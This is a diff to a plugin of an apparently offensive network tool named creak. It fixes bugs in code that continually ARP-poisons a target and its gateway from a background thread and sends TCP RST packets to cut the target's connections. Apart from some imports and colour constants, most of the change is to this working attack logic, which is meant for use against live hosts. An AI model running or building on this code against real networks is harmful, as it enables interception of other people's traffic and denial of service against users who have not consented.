@@ -19,8 +19,10 @@
 # USA
 
 import time
+from threading import Thread
 from socket import socket, PF_PACKET, SOCK_RAW
 try:
+    import pcap
     import dpkt
 except ImportError:
     print("[!] Missing modules pcap or dpkt, try setting SCAPY to True in config.py "
@@ -28,6 +30,8 @@ except ImportError:
 from baseplugin import BasePlugin
 import creak.utils as utils
 import creak.config as config
+
+(G, W, R) = (utils.G, utils.W, utils.R)
 
 class Plugin(BasePlugin):
 
@@ -94,8 +98,8 @@ class Plugin(BasePlugin):
         stop = False
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((kwargs['dev'], dpkt.ethernet.ETH_TYPE_ARP))
-        pcap_filter = self._build_pcap_filter("ip host ", port)
-
+        pcap_filter = self._build_pcap_filter("ip host ", kwargs['port'])
+        source = kwargs['src_mac'] if hasattr(kwargs, 'src_mac') else utils.get_default_gateway_linux()
         # need to create a daemon that continually poison our target
         poison_thread = Thread(target=self._poison,
                                args=(kwargs['dev'], source, kwargs['gateway'], kwargs['target'], 2, lambda: stop))
@@ -109,10 +113,10 @@ class Plugin(BasePlugin):
               + ' and ' + R
               + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W +'\n')
 
-        if port:
+        if kwargs['port']:
             print('[+] Sending RST packets to ' + R
                   + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target'])
-                  + W + ' on port ' + R + port + W)
+                  + W + ' on port ' + R + kwargs['port'] + W)
         else:
             print('[+] Sending RST packets to ' + R
                   + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W)
